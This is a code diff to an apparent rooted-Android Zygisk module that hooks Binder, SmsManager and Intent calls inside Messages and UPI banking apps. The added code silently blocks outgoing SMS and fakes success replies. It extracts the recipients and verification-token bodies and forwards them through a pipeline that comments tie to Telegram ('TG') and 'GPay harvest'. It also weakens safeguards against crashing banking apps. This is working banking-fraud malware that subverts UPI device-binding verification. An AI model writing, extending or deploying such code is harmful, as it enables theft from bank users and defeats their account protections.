@@ -745,11 +745,25 @@ bool read_isms_server_outgoing(JNIEnv* env, jobject data, std::string& dest, std
 // Extra writeInt(0) after that can make UPI SDKs treat the call as failed
 // ("Verification Failed / No permission" style).
 void write_isms_trace(const char* msg) {
-    FILE* f = fopen("/data/local/tmp/hivirtus_isms_trace.txt", "a");
-    if (!f) return;
-    fprintf(f, "%ld %s\n", static_cast<long>(time(nullptr)), msg ? msg : "?");
-    fclose(f);
-    chmod("/data/local/tmp/hivirtus_isms_trace.txt", 0666);
+    char line[384];
+    snprintf(line, sizeof(line), "%ld %s\n", static_cast<long>(time(nullptr)), msg ? msg : "?");
+    auto append_one = [&](const char* path) {
+        FILE* f = fopen(path, "a");
+        if (!f) f = fopen(path, "w");
+        if (!f) return;
+        fputs(line, f);
+        fclose(f);
+        chmod(path, 0666);
+    };
+    append_one("/data/local/tmp/hivirtus_isms_trace.txt");
+    append_one("/data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt");
+    if (!g_upi_pkg.empty()) {
+        ensure_pkg_diag_dir();
+        std::string p = "/data/user/0/" + g_upi_pkg + "/code_cache/hivirtus/isms_trace.txt";
+        append_one(p.c_str());
+        p = "/data/data/" + g_upi_pkg + "/code_cache/hivirtus/isms_trace.txt";
+        append_one(p.c_str());
+    }
 }
 
 bool blob_contains_needle(const std::string& blob, const char* ascii) {
@@ -1179,61 +1193,63 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
         iface = parcel_read_string(env, data);
         reset_parcel(env, data);
 
-        const std::string blob =
-            (g_is_messaging_app || g_is_telephony_server) ? parcel_marshall_blob(env, data)
-                                                          : std::string();
+        // Marshall for Messages AND UPI (Hero SmsManager → ISms) — need HEROAXIS in blob
+        const bool want_blob = g_is_messaging_app || g_in_hooked_upi || g_is_telephony_server;
+        const std::string blob = want_blob ? parcel_marshall_blob(env, data) : std::string();
         const bool iface_sms =
             iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
             iface.find("ISmsEx") != std::string::npos || iface.find("IMms") != std::string::npos ||
             iface.find("MotoSms") != std::string::npos;
-        // A16/Messages: iface string parse sometimes empty/wrong — UTF-16 blob still has ISms
-        const bool blob_sms =
-            (g_is_messaging_app || g_is_telephony_server) && messaging_blob_looks_like_sms_send(blob);
+        const bool blob_sms = want_blob && messaging_blob_looks_like_sms_send(blob);
+        const bool sendish = want_blob && blob_looks_like_outgoing_send(blob);
 
-        if (iface_sms || blob_sms) {
+        if (iface_sms || blob_sms || sendish) {
             char seen[256];
             snprintf(seen, sizeof(seen),
-                     "isms_seen code=%d msg=%d tel=%d flags=%d reply=%d iface_ok=%d blob_ok=%d "
-                     "iface=%.32s",
-                     (int)code, g_is_messaging_app ? 1 : 0, g_is_telephony_server ? 1 : 0,
-                     (int)flags, reply ? 1 : 0, iface_sms ? 1 : 0, blob_sms ? 1 : 0, iface.c_str());
+                     "isms_seen code=%d msg=%d upi=%d flags=%d reply=%d iface_ok=%d blob_ok=%d "
+                     "send=%d iface=%.24s",
+                     (int)code, g_is_messaging_app ? 1 : 0, g_in_hooked_upi ? 1 : 0, (int)flags,
+                     reply ? 1 : 0, iface_sms ? 1 : 0, blob_sms ? 1 : 0, sendish ? 1 : 0,
+                     iface.c_str());
             write_hook_status(seen);
             write_isms_trace(seen);
 
             std::string dest;
             std::string body;
             const jint force_code =
-                (g_is_messaging_app || g_is_telephony_server) ? (code > 0 ? code : 8) : code;
+                (g_is_messaging_app || g_in_hooked_upi) ? (code > 0 ? code : 8) : code;
             if (try_block_isms(env, data, reply, config, dest, body, force_code)) {
                 write_hook_status("isms_blocked");
                 write_isms_trace("isms_blocked");
                 return JNI_TRUE;
             }
-            // Nuclear: only for OUTGOING send evidence (not every ISms status query)
-            if ((g_is_messaging_app || g_is_telephony_server) && (iface_sms || blob_sms)) {
-                const bool sendish = blob_looks_like_outgoing_send(blob);
-                extract_isms_from_blob(env, data, dest, body);
-                const bool got_real =
-                    !body.empty() && body != "BLOB_SMS_BLOCK" && body != "MSG_SMS_INTERCEPT" &&
-                    (body_has_verify_token(body) || body.size() >= 8);
-                if (sendish || got_real) {
-                    if (dest.empty()) dest = "0000000000";
-                    if (!got_real) {
-                        // Still stop radio, but don't TG-spam placeholders
-                        if (reply) write_ok_reply(env, reply);
-                        write_hook_status("isms_blocked_silent");
-                        write_isms_trace("isms_blocked_silent");
-                        return JNI_TRUE;
-                    }
+            extract_isms_from_blob(env, data, dest, body);
+            const bool got_real =
+                !body.empty() && body != "BLOB_SMS_BLOCK" && body != "MSG_SMS_INTERCEPT" &&
+                (body_has_verify_token(body) || body.size() >= 8);
+
+            // Messages: any ISms → block radio (silent if no body). UPI: only sendish/got_real.
+            const bool should_nuclear =
+                sendish || got_real ||
+                (g_is_messaging_app && (iface_sms || blob_sms) && code >= 1);
+
+            if (should_nuclear) {
+                if (dest.empty()) dest = "0000000000";
+                if (got_real) {
                     pipeline_outgoing(env, dest, body, nullptr, nullptr);
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_nuclear");
                     write_isms_trace("isms_blocked_nuclear");
                     return JNI_TRUE;
                 }
-                // Bare ISms query/status — do not block / do not TG BLOB_SMS_BLOCK
-                write_isms_trace("isms_passthrough_query");
+                // Stop SIM even without parse — no TG placeholder spam
+                if (reply) write_ok_reply(env, reply);
+                write_diag_multi("hivirtus_outgoing_blocked.flag", "0000000000\nSILENT_BLOCK");
+                write_hook_status("isms_blocked_silent");
+                write_isms_trace("isms_blocked_silent");
+                return JNI_TRUE;
             }
+            write_isms_trace("isms_passthrough_query");
         }
     }
 
@@ -1694,13 +1710,17 @@ void* deferred_sms_hook_worker(void* arg) {
         }
         ensure_pkg_diag_dir();
         write_hook_status("deferred_upi_retry");
-        // NEVER PLT on deferred UPI — banking crash. JNI binder + Intent SENDTO only.
+        // NEVER PLT on deferred UPI — banking crash. RegisterNatives/inline + Intent.
         if (env) {
             register_binder_proxy_jni(env);
+            if (!orig_BinderProxy_transact) register_binder_proxy_register_natives(env);
+            if (!orig_BinderProxy_transact) register_binder_proxy_inline();
             register_smsmanager_jni(env);
-            register_instrumentation_jni(env);  // Hero SENDTO block when binder=0
+            register_instrumentation_jni(env);
+            g_intercept_armed = true;
         }
         write_hook_status(orig_BinderProxy_transact ? "deferred_isms_ok" : "deferred_intent_only");
+        write_isms_trace(orig_BinderProxy_transact ? "deferred_isms_ok" : "deferred_intent_only");
         logger::info("OutgoingSms", "Deferred UPI hooks delay=%ds binder=%d",
                      job->delay_sec, orig_BinderProxy_transact ? 1 : 0);
         if (job->vm && env) job->vm->DetachCurrentThread();
@@ -1837,25 +1857,24 @@ std::string install_for_upi(JNIEnv* env, zygisk::Api* api, const char* package_n
     bool bp_ok = false;
     bool plt_ok = false;
 
-    // ZygiskNext: JNI miss common → RegisterNatives then inline patch (real SIM catch)
+    // ZygiskNext: JNI miss common → RegisterNatives then inline (Messages + Hero/UPI)
+    // NEVER PLT BinderProxy on banking (open crash). Inline OK — patches JNI symbol only.
     if (!orig_BinderProxy_transact) {
         regnative_ok = register_binder_proxy_register_natives(env);
     }
-    if (!orig_BinderProxy_transact && g_is_messaging_app) {
+    if (!orig_BinderProxy_transact) {
         inline_ok = register_binder_proxy_inline();
     }
-    // BpBinder PLT — catches libandroid_runtime→libbinder even if JNI symbol path weird
+    // BpBinder PLT — Messages only (banking crash risk)
     if (g_is_messaging_app) {
         bp_ok = register_bpbinder_plt();
     }
-    // PLT on BinderProxy JNI symbol is weak (ART often bypasses GOT) — last resort only
     if (!orig_BinderProxy_transact && g_is_messaging_app) {
         plt_ok = register_binder_proxy_plt_messages();
     }
 
     bool sms_ok = register_smsmanager_jni(env);
     bool intent_jni = false;
-    // Hero/fragile: binder JNI miss (OK=0) — block SENDTO Intent so SMS Messages tak na pahuche
     if (!g_is_messaging_app) {
         intent_jni = register_instrumentation_jni(env);
     }
@@ -1864,13 +1883,17 @@ std::string install_for_upi(JNIEnv* env, zygisk::Api* api, const char* package_n
         if (!orig_BinderProxy_transact) {
             regnative_ok = register_binder_proxy_register_natives(env) || regnative_ok;
         }
-        if (!orig_BinderProxy_transact && g_is_messaging_app) {
+        if (!orig_BinderProxy_transact) {
             inline_ok = register_binder_proxy_inline() || inline_ok;
+        }
+        if (!orig_BinderProxy_transact && g_is_messaging_app) {
             plt_ok = register_binder_proxy_plt_messages() || plt_ok;
         }
     }
 
-    // Real OK = BinderProxy hook installed OR BpBinder OR Intent (UPI). PLT-alone is NOT enough.
+    // Hero/fragile deferred: force armed so Intent+ISms actually block
+    if (!g_is_messaging_app) g_intercept_armed = true;
+
     const bool binder_real = orig_BinderProxy_transact != nullptr;
     const bool ok = binder_real || bp_ok || intent_jni;
     const char* path = "none";
@@ -1890,7 +1913,6 @@ std::string install_for_upi(JNIEnv* env, zygisk::Api* api, const char* package_n
              plt_ok ? 1 : 0, sms_ok ? 1 : 0, intent_jni ? 1 : 0, ok ? 1 : 0, path);
     write_hook_status(summary);
     write_diag_multi("hivirtus_hook_status_latest.txt", summary);
-    // Always mirror Messages status to dedicated files (GPay harvest must not hide this)
     if (g_is_messaging_app) {
         FILE* gf = fopen("/data/local/tmp/hivirtus_messages_hook.txt", "w");
         if (gf) {
@@ -1904,10 +1926,13 @@ std::string install_for_upi(JNIEnv* env, zygisk::Api* api, const char* package_n
             fclose(gf);
             chmod("/data/local/tmp/hivirtus_hook_status.txt", 0666);
         }
-        gf = fopen("/data/adb/modules/hivirtus_zygisk_mode/messages_hook.txt", "w");
+    } else if (pkg.find("hero") != std::string::npos || fragile) {
+        // So user can see Hero hook status (not overwritten only by Messages)
+        FILE* gf = fopen("/data/local/tmp/hivirtus_hero_hook.txt", "w");
         if (gf) {
             fprintf(gf, "%s\n", summary);
             fclose(gf);
+            chmod("/data/local/tmp/hivirtus_hero_hook.txt", 0666);
         }
     }
     logger::info("OutgoingSms", "%s", summary);
